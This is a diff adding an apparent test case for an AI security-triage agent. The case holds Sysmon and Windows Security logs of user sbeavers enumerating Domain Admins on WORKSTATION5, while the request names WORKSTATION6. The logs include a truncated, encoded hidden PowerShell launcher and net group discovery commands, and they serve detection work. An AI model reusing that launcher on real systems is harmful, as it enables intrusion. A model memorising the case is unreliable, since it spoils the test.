@@ -1,0 +1,41 @@
+{
+  "case_id": "test-19:E3",
+  "profile": "Profile of window SDWIN-190518201207: 1749 events. Request: An implant running as sbeavers on WORKSTATION6 is enumerating the Domain Admins group. Disable account sbeavers. Target: {\"account\": \"sbeavers\"}.",
+  "queries": [
+    {
+      "sql": "SELECT * FROM process_create WHERE record_id IN (510, 536, 672, 676) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 510, \"ts\": \"2020-09-21T08:09:16.014000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 1, \"image\": \"C:\\\\Windows\\\\System32\\\\net.exe\", \"command_line\": \"\\\"C:\\\\windows\\\\system32\\\\net.exe\\\" group \\\"Domain Admins\\\" /domain\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"parent_command_line\": \"\\\"C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAFIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAFIAUwBJAE8ATgAuAE0AQQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJAA0ADMA…[cut: 5164 chars]\", \"pid\": null, \"ppid\": 5724, \"user\": \"sbeavers\", \"integrity_level\": \"Medium\", \"hashes\": \"SHA1=5B9EA3C45A11D4AEB1B1AC0F72C4C19308FC7D0B,MD5=A63DF9A6E9098CC189F2A3EFC37600F6,SHA256=96CDFD7B263947A6A7C0DB54141A6B8D7777DB0A03A17CBF95666D98422F937B,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07\"}\n{\"record_id\": 536, \"ts\": \"2020-09-21T08:09:16.030000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 1, \"image\": \"C:\\\\Windows\\\\System32\\\\net1.exe\", \"command_line\": \"C:\\\\windows\\\\system32\\\\net1 group \\\"Domain Admins\\\" /domain\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\net.exe\", \"parent_command_line\": \"\\\"C:\\\\windows\\\\system32\\\\net.exe\\\" group \\\"Domain Admins\\\" /domain\", \"pid\": null, \"ppid\": 3892, \"user\": \"sbeavers\", \"integrity_level\": \"Medium\", \"hashes\": \"SHA1=F926F9421606D1AAADAF798DB2B3A0BD3009A2C3,MD5=3315CF38117D3CCBAC0B40EECC633FBB,SHA256=195A557E92A631E29ECF789C360A99C0F5D2D1BECEA33153CCA60E63D04CEE01,IMPHASH=D115CDECBD7EB553182EAD3D45F5816C\"}\n{\"record_id\": 672, \"ts\": \"2020-09-21T08:09:17.102000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Security\", \"event_id\": 4688, \"image\": \"C:\\\\Windows\\\\System32\\\\net.exe\", \"command_line\": \"\\\"C:\\\\windows\\\\system32\\\\net.exe\\\" group \\\"Domain Admins\\\" /domain\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"parent_command_line\": null, \"pid\": 3892, \"ppid\": 5724, \"user\": \"sbeavers\", \"integrity_level\": \"Medium\", \"hashes\": null}\n{\"record_id\": 676, \"ts\": \"2020-09-21T08:09:17.104000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Security\", \"event_id\": 4688, \"image\": \"C:\\\\Windows\\\\System32\\\\net1.exe\", \"command_line\": \"C:\\\\windows\\\\system32\\\\net1 group \\\"Domain Admins\\\" /domain\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\net.exe\", \"parent_command_line\": null, \"pid\": 9656, \"ppid\": 3892, \"user\": \"sbeavers\", \"integrity_level\": \"Medium\", \"hashes\": null}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 4,
+      "registered": [
+        510,
+        536,
+        672,
+        676
+      ]
+    },
+    {
+      "sql": "SELECT * FROM process_access WHERE record_id IN (511, 512, 517, 537, 540) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 511, \"ts\": \"2020-09-21T08:09:16.014000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"source_pid\": 5724, \"target_image\": \"C:\\\\windows\\\\system32\\\\net.exe\", \"target_pid\": 3892, \"granted_access\": \"0x1fffff\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9d8e4|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+59e1a|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+567b6|C:\\\\windows\\\\System32\\\\KERNEL32.DLL+1be93|C:\\\\windows\\\\assembly\\\\NativeImages_v4.0.30319…[cut: 1271 chars]\", \"user\": null}\n{\"record_id\": 512, \"ts\": \"2020-09-21T08:09:16.015000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\csrss.exe\", \"source_pid\": 8700, \"target_image\": \"C:\\\\windows\\\\system32\\\\net.exe\", \"target_pid\": 3892, \"granted_access\": \"0x1fffff\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\system32\\\\basesrv.DLL+2fba|C:\\\\windows\\\\SYSTEM32\\\\CSRSRV.dll+5af4|C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+6ce5f\", \"user\": null}\n{\"record_id\": 517, \"ts\": \"2020-09-21T08:09:16.018000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\conhost.exe\", \"source_pid\": 8528, \"target_image\": \"C:\\\\windows\\\\system32\\\\net.exe\", \"target_pid\": 3892, \"granted_access\": \"0x1fffff\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+305fe|C:\\\\windows\\\\system32\\\\conhost.exe+1260d|C:\\\\windows\\\\system32\\\\conhost.exe+12505|C:\\\\windows\\\\system32\\\\conhost.exe+895c|C:\\\\windows…[cut: 301 chars]\", \"user\": null}\n{\"record_id\": 537, \"ts\": \"2020-09-21T08:09:16.031000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\net.exe\", \"source_pid\": 3892, \"target_image\": \"C:\\\\windows\\\\system32\\\\net1.exe\", \"target_pid\": 9656, \"granted_access\": \"0x1fffff\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9d8e4|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+59e1a|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+567b6|C:\\\\windows\\\\System32\\\\KERNEL32.DLL+1be93|C:\\\\windows\\\\system32\\\\net.exe+1939|C:\\\\windows…[cut: 363 chars]\", \"user\": null}\n{\"record_id\": 540, \"ts\": \"2020-09-21T08:09:16.033000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\csrss.exe\", \"source_pid\": 8700, \"target_image\": \"C:\\\\windows\\\\system32\\\\net1.exe\", \"target_pid\": 9656, \"granted_access\": \"0x1fffff\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\system32\\\\basesrv.DLL+2fba|C:\\\\windows\\\\SYSTEM32\\\\CSRSRV.dll+5af4|C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+6ce5f\", \"user\": null}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 5,
+      "registered": [
+        511,
+        512,
+        517,
+        537,
+        540
+      ]
+    }
+  ],
+  "findings": "Records 511, 537, 672, 676 look relevant to the request; deciding on the next action.",
+  "retrieved": [
+    510,
+    511,
+    512,
+    517,
+    536,
+    537,
+    540,
+    672,
+    676
+  ]
+}
